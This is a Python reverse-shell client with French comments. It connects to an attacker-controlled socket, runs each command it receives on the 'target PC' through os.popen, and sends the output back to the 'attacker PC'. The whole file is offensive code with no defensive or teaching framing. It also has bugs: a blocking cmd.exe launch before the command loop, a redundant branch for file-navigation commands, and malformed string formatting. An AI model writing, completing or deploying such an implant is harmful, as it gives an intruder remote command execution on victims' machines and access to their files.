import socket
import os
import subprocess
import time
import sys

# Définition de l'adresse IP et du port d'écoute du serveur
HOST = '127.0.0.1'
PORT = 8080


# Création de l'objet socket et connexion au serveur sur le PC cible
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print("[*] connection établie entre toi et la cible {} sur le port {}".format({HOST}, {PORT}))
    
    subprocess.run("cmd.exe")

    # Boucle principale pour recevoir des commandes du PC attaquant
    while True:
        # Réception de la commande à exécuter sur le PC cible
        data = s.recv(1024)
        print("les données recus sont {}".format(data))
        command = data.decode().strip()

        # Si la commande est "exit", on ferme la connexion et on quitte la boucle
        if command == "exit":
            print("[!] Connexion perdue")
            time.sleep(2)
            s.close()
            sys.exit()

        # Si la commande est une commande pour naviguer dans les fichiers, on utilise la bibliothèque os
        if command.startswith("cd") or command.startswith("dir") or command.startswith("ls") or command.startswith("cd ..") or command.startswith("start"):
            # Exécution de la commande shell à l'aide de la bibliothèque os
            output = os.popen(command).read()
            # Envoi de la sortie de la commande au PC attaquant
            s.sendall(output.encode())
        # Si la commande est une autre commande shell, on l'exécute simplement et on envoie la sortie au PC attaquant
        else:
            # Exécution de la commande shell à l'aide de la bibliothèque os
            output = os.popen(command).read()
            # Envoi de la sortie de la commande au PC attaquant
            s.sendall(output.encode())


